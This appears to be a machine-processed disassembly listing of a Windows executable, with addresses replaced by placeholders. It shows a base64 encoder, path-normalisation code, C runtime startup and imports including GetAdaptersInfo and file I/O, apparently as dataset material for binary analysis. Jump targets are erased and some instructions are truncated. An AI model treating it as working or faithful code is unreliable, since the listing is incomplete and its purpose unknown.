mov esi eax
push esi
push edi
push edx
call sub_404a90
add esp 0x10
mov eax esi
pop edi
pop esi
retn
sub_404a90
push ebp
mov ebp [ esp + 0xc ]
push esi
mov esi [ esp + 0x14 ]
cmp ebp 0x3
push edi
jl r-xdata
mov eax [ esp + 0x10 ]
mov eax 0xaaaaaaab
mul ebp
mov edi edx
shr edi 0x1
lea eax [ edi * 4 ]
sub eax edi
neg eax
add ebp eax
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov [ esi ] 0x0
mov eax esi
pop edi
pop esi
sub eax ecx
pop ebp
retn
mov edx [ rw-data ]
xor ecx ecx
mov cl [ eax ]
shr ecx 0x2
cmp ebp 0x1
mov cl [ ecx + edx ]
mov [ esi ] cl
mov cl 0x3d
jne r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov cl [ eax ]
add eax 0x3
shr ecx 0x2
add esi 0x4
mov cl [ ecx + edx ]
mov [ esi - 0x4 ] cl
mov dl [ eax - 0x3 ]
xor ecx ecx
and edx 0x3
mov cl [ eax - 0x2 ]
shl edx 0x4
shr ecx 0x4
or edx ecx
mov ecx [ rw-data ]
mov dl [ edx + ecx ]
mov [ esi - 0x3 ] dl
mov cl [ eax - 0x2 ]
xor edx edx
and ecx 0xf
mov dl [ eax - 0x1 ]
shl ecx 0x2
shr edx 0x6
or ecx edx
mov edx [ rw-data ]
mov cl [ ecx + edx ]
mov [ esi - 0x2 ] cl
mov dl [ eax - 0x1 ]
mov ecx [ rw-data ]
and edx 0x3f
dec edi
mov dl [ edx + ecx ]
mov [ esi - 0x1 ] dl
jne r-xdata
jmp r-xdata
mov dl [ eax ]
mov edi [ rw-data ]
push ebx
xor ebx ebx
mov bl [ eax + 0x1 ]
and edx 0x3
shl edx 0x4
shr ebx 0x4
or edx ebx
pop ebx
mov dl [ edx + edi ]
mov [ esi + 0x1 ] dl
mov al [ eax + 0x1 ]
mov edx [ rw-data ]
and eax 0xf
mov al [ edx + eax * 4 ]
mov [ esi + 0x2 ] al
mov dl [ eax ]
mov eax [ rw-data ]
and edx 0x3
shl edx 0x4
mov dl [ edx + eax ]
mov [ esi + 0x2 ] cl
mov [ esi + 0x1 ] dl
jmp r-xdata
test ebp ebp
jle r-xdata
mov [ esi + 0x3 ] cl
add esi 0x4
sub_404bb0
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
push edi
mov ecx ebp
inc ecx
jmp r-xdata
cmp al 0x9
jne r-xdata
mov al [ ecx ]
cmp al 0x20
je r-xdata
push ecx
push rw-data
push ebp
call sprintf
push 0x2
lea eax [ ebp + 0x1 ]
push rw-data
push eax
call strncmp
add esp 0x18
test eax eax
je r-xdata
push ebp
call _strdup
add esp 0x4
test eax eax
jne r-xdata
push 0x1
push rw-data
push ebp
call strncmp
add esp 0xc
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
push 0x1
call exit
mov edi [ rw-data ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi ebp
mov edx ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea ebx [ edx + ecx + 0x2 ]
push ebx
call malloc
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
mov ecx ebx
xor eax eax
mov edx ecx
mov edi esi
shr ecx 0x2
[ edi ]
mov ecx edx
push 0x1
and ecx 0x3
push rw-data
[ edi ]
mov eax [ rw-data ]
push eax
call strncmp
mov edx [ rw-data ]
add esp 0xc
test eax eax
jne r-xdata
push 0x1
call exit
push ebp
push edx
push rw-data
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp ecx 0x1
jne r-xdata
push ebp
push edx
push rw-data
jmp r-xdata
push ebx
push esi
call _snprintf
add esp 0x14
push esi
call sub_404cc0
add esp 0x4
mov eax esi
sub_404cc0
push ebx
mov ebx [ esp + 0x8 ]
push edi
mov edi ebx
mov cl [ ebx ]
test cl cl
je r-xdata
pop edi
pop ebx
retn
push ebp
cmp cl 0x5c
push esi
je r-xdata
lea eax [ ebx + 0x1 ]
mov ebp 0x1
mov edi eax
cmp cl 0x2f
je r-xdata
cmp cl 0x5c
je r-xdata
add edi 0x2
mov dl [ ebx + 0x1 ]
lea eax [ ebx + 0x1 ]
cmp dl 0x3a
jne r-xdata
test al al
je r-xdata
cmp cl 0x2f
jne r-xdata
xor ebp ebp
jmp r-xdata
mov dl [ ebx + 0x2 ]
cmp dl 0x5c
je r-xdata
mov esi edi
mov edx edi
mov eax edi
cmp al 0x5c
je r-xdata
mov al [ eax ]
cmp al 0x3a
jne r-xdata
cmp dl 0x2f
je r-xdata
inc edx
jmp r-xdata
cmp cl 0x2f
jne r-xdata
inc edi
cmp al 0x2f
jne r-xdata
mov cl [ edx ]
cmp cl 0x5c
je r-xdata
mov cl [ edx ]
test cl cl
je r-xdata
pop esi
cmp eax ebx
pop ebp
jne r-xdata
cmp cl 0x2e
jne r-xdata
mov [ eax ] 0x0
mov [ eax ] 0x2e
inc eax
cmp eax edi
je r-xdata
mov cl [ edx + 0x1 ]
test cl cl
je r-xdata
mov cl [ edx ]
test cl cl
je r-xdata
mov [ eax ] 0x5c
inc eax
cmp cl 0x5c
je r-xdata
cmp cl 0x5c
je r-xdata
cmp cl 0x2f
je r-xdata
cmp cl 0x2f
je r-xdata
cmp cl 0x2e
jne r-xdata
mov [ eax ] cl
mov cl [ edx + 0x1 ]
inc eax
inc edx
test cl cl
jne r-xdata
mov cl [ edx + 0x2 ]
test cl cl
je r-xdata
jmp r-xdata
test ebp ebp
jne r-xdata
cmp cl 0x5c
je r-xdata
cmp eax esi
je r-xdata
cmp eax esi
jne r-xdata
cmp cl 0x2f
jne r-xdata
add edx 0x2
jmp r-xdata
dec eax
cmp eax esi
jbe r-xdata
cmp eax edi
je r-xdata
mov cl [ eax ]
cmp cl 0x5c
je r-xdata
mov [ eax ] 0x2e
inc eax
mov [ eax ] 0x2e
inc eax
mov esi eax
add edx 0x2
jmp r-xdata
mov [ eax ] 0x5c
inc eax
cmp cl 0x2f
je r-xdata
dec eax
cmp eax esi
ja r-xdata
sub_404e40
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_405037
cmp [ rw-data ] ebx
jne r-xdata
call sub_405022
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_405034
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_401000
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_401a3f
push 0x0
call exit
exit
jmp [ exit@IAT ]
strstr
jmp [ strstr@IAT ]
malloc
jmp [ malloc@IAT ]
free
jmp [ free@IAT ]
strncpy
jmp [ strncpy@IAT ]
_snprintf
jmp [ _snprintf@IAT ]
sprintf
jmp [ sprintf@IAT ]
_sleep
jmp [ _sleep@IAT ]
strrchr
jmp [ strrchr@IAT ]
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
realloc
jmp [ realloc@IAT ]
strncmp
jmp [ strncmp@IAT ]
fflush
jmp [ fflush@IAT ]
fwrite
jmp [ fwrite@IAT ]
fclose
jmp [ fclose@IAT ]
_filelength
jmp [ _filelength@IAT ]
fopen
jmp [ fopen@IAT ]
fprintf
jmp [ fprintf@IAT ]
toupper
jmp [ toupper@IAT ]
_strnicmp
jmp [ _strnicmp@IAT ]
_msize
jmp [ _msize@IAT ]
fread
jmp [ fread@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_405022
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_405034
xor eax eax
retn
sub_405037
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
GetAdaptersInfo
jmp [ GetAdaptersInfo@IAT ]
_strdup
jmp [ _strdup@IAT ]
_itoa
jmp [ _itoa@IAT ]
_stat
jmp [ _stat@IAT ]
sub_405070
mov eax r--data
jmp __CxxFrameHandler
